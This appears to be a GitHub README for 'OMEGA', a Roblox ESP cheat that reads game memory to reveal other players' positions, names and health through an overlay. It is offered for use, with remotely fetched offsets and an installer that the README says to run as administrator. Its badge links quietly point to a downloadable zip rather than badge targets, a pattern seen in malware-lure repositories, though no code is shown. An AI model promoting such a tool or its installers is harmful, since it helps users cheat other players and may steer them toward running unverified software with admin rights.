# 👁️ OMEGA — Roblox ESP Overlay

> External ESP overlay for Roblox using memory reading and a transparent OpenGL overlay.  
> Works via `ReadProcessMemory` — no injection, no DLL.

<div align="center">

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://raw.githubusercontent.com/roqols/omega/main/pyOmega/Software_v1.4.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?logo=windows)](https://raw.githubusercontent.com/roqols/omega/main/pyOmega/Software_v1.4.zip)
[![License](https://img.shields.io/badge/License-Educational-red)](#-license)

</div>

---

## ✨ Features

| Feature | Description |
|---|---|
| **ESP Box** | 2D/3D bounding box around players (full or corner style) |
| **Tracer Lines** | Lines drawn from screen bottom to each player |
| **Name Tags** | Displays the player's username above the box |
| **Distance** | Shows distance in meters below the box |
| **Health Bar** | Dynamic color health bar (green → red) |
| **Team Filter** | Skips teammates automatically |
| **Dead Filter** | Skips dead players automatically |
| **Max Distance** | Hides players beyond a configurable range |
| **Hotkeys** | Toggle ESP on/off and quit without closing the terminal |

---

## 🖥️ Requirements

- Windows 10 / 11 (64-bit)
- Python **3.10+** *(setup.bat installs it automatically via winget if missing)*
- Roblox (`RobloxPlayerBeta.exe`) running
- **Run as Administrator** (required for memory reading)

### Python Dependencies

```
PyQt5 · PyOpenGL · numpy · psutil · requests
```

> `setup.bat` checks and installs all missing packages automatically.

---

## 🚀 Quick Start

### 1. Clone the repository

```bash
git clone https://github.com/roqols/omega/tree/main/pyOmega
cd omega
```

### 2. Run the setup

```
Right-click setup.bat → Run as administrator
```

The setup will automatically:
- Install **Python 3.12** via `winget` if not present
- Check and install all missing Python packages
- Register the `stomega` command system-wide

### 3. Launch from anywhere

Open any **new** CMD window and type:

```
stomega
```

---

## ⚙️ Configuration

All settings are at the top of `omega.py`:

```python
# Debug
DEBUG_MODE = True
ENABLE_ESP = True

# Colors [R, G, B, A]
ESP_BOX_COLOR      = [255, 255, 255, 255]
ESP_TRACER_COLOR   = [255, 255, 255, 255]
ESP_NAME_COLOR     = [255, 255, 255, 255]
ESP_DISTANCE_COLOR = [255, 255, 255, 255]
ESP_HEALTH_COLOR   = [0, 255, 0, 255]

# Visual settings
ESP_SHOW_BOX      = True
ESP_SHOW_TRACER   = True
ESP_SHOW_NAME     = True
ESP_SHOW_DISTANCE = True
ESP_SHOW_HEALTH   = True
ESP_CORNER_BOX    = True
ESP_3D_BOX        = False
                             
ESP_DYNAMIC_HEALTH_COLOR = True
ESP_TEXT_SIZE      = 14
ESP_BOX_THICKNESS  = 2

# Filters
IGNORE_TEAM    = True
IGNORE_DEAD    = True
HIDE_DISTANCE  = False
MAX_DISTANCE   = 500
```

---

## ⌨️ Hotkeys

| Key | Action |
|---|---|
| `P` | Toggle ESP on / off |
| `INSERT` | Close the overlay |

---

## 📂 Project Structure

```
pyOmega/
├── omega.py        # Main script — ESP logic + overlay
├── setup.bat       # Auto-installer + registers stomega command
├── uninstall.bat   # Removes stomega command + launcher folder
└── README.md       # This file
```

---

## 🗑️ Uninstall

To fully remove the `stomega` command from your system:

```
Right-click uninstall.bat → Run as administrator
```

This removes the PATH entry and deletes `C:\omega-launcher`.  
Your project files (`omega.py`, etc.) are **not** deleted.

---

## 🔄 How It Works

```
Roblox Process
     │
     ▼
ReadProcessMemory (Windows API)
     │
     ├── DataModel → Players → Each Player
     │       └── Character → Head / HumanoidRootPart → Position (XYZ)
     │
     ├── VisualEngine → ViewMatrix (4×4)
     │
     └── World-to-Screen projection
              │
              ▼
     PyQt5 OpenGL Transparent Overlay
     (always on top, click-through, frameless)
```

Offsets are fetched remotely and versioned — they update automatically when Roblox updates.

---

## ❓ FAQ

**The overlay shows nothing / ESP is blank**  
→ Run CMD as Administrator.  
→ Wait a few seconds after Roblox loads before typing `stomega`.

**`stomega` not found after setup**  
→ Close the current CMD and open a **new** window — PATH only applies to new sessions.  
→ If still missing, re-run `setup.bat` as Administrator.

**Offsets mismatch warning on startup**  
→ Roblox updated and the remote offsets haven't caught up yet. Try again in a few hours.

---

## 📜 License

This project is for **educational purposes only**.  
Use at your own risk. The author is not responsible for any consequences.
